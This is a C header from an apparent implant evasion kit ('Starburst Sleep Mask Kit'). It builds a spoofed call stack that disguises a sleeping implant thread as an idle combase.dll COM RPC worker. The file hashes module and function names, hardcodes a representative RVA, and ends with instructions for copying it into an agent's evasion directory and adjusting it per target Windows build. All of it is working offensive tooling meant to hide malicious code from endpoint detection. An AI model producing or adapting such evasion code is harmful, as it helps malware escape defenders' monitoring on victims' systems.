/*
 * Starburst Sleep Mask Kit - COM Worker Thread Profile (4-frame)
 *
 * Mimics the idle call stack of a COM RPC worker thread managed by the
 * COM runtime (combase.dll). These threads handle incoming COM/RPC calls
 * and are present in any process that initializes COM with a multi-threaded
 * apartment (CoInitializeEx with COINIT_MULTITHREADED).
 *
 * Spoofed stack (as seen by a debugger, top = innermost):
 *
 *   combase!CRpcThread::WorkerLoop+0x1b     <-- RVA mode (non-exported)
 *   ntdll!TpReleasePool+0x402
 *   kernel32!BaseThreadInitThunk+0x14
 *   ntdll!RtlUserThreadStart+0x21
 *
 * Where you would see this pattern:
 *   - explorer.exe (Windows Shell, heavy COM user)
 *   - mmc.exe (Microsoft Management Console)
 *   - svchost.exe instances hosting COM-based services
 *   - Any process with COM multi-threaded apartment threads
 *   - DCOM server processes
 *
 * NOTE: CRpcThread::WorkerLoop is a C++ class method internal to
 * combase.dll and is NOT exported. It must be referenced via module
 * RVA mode (func_hash = 0, offset = RVA). The RVA 0x1234b is a
 * representative value for Windows 10 22H2 x64. You should verify
 * this RVA against your target OS build using a disassembler or
 * getFunctionOffset with symbol support.
 *
 * Usage: Copy this file to agent_code/include/evasion/spoof_profiles.h
 */

#ifndef STARBURST_EVASION_SPOOF_PROFILES_H
#define STARBURST_EVASION_SPOOF_PROFILES_H

#include <constexpr.h>
#include <stdint.h>

#define SPOOF_MAX_FRAMES 10

struct SPOOF_FRAME_DEF {
    uint32_t module_hash;
    uint32_t func_hash;
    uint32_t offset;
};

static inline void populate_spoof_frames(
    SPOOF_FRAME_DEF* frames, uint32_t* count
) {
    uint32_t i = 0;

    /*
     * Frame 0 (innermost): combase!CRpcThread::WorkerLoop+0x1b
     *
     * The COM RPC worker loop where idle COM threads wait for incoming
     * RPC requests. This function is internal to combase.dll (not
     * exported), so we use RVA mode: func_hash is set to 0 and offset
     * contains the module-relative virtual address.
     *
     * RVA 0x1234b is representative for Windows 10 22H2 x64.
     * Adjust for your target build:
     *   - Win10 21H2: verify via disassembly of combase.dll
     *   - Win11 23H2: RVA may differ significantly
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"combase.dll" );
    frames[i].func_hash   = 0;        /* RVA mode -- non-exported function */
    frames[i].offset      = 0x1234b;  /* Module RVA of CRpcThread::WorkerLoop+0x1b */
    i++;

    /*
     * Frame 1: ntdll!TpReleasePool+0x402
     *
     * COM worker threads are backed by the NT thread pool. When idle,
     * the stack passes through TpReleasePool as the pool manages the
     * worker lifecycle.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TpReleasePool" );
    frames[i].offset      = 0x402;
    i++;

    /*
     * Frame 2: kernel32!BaseThreadInitThunk+0x14
     *
     * Standard thread dispatch function.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    /*
     * Frame 3 (outermost): ntdll!RtlUserThreadStart+0x21
     *
     * Thread entry point at the bottom of the stack.
     */
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;

    *count = i;
}

#endif /* STARBURST_EVASION_SPOOF_PROFILES_H */
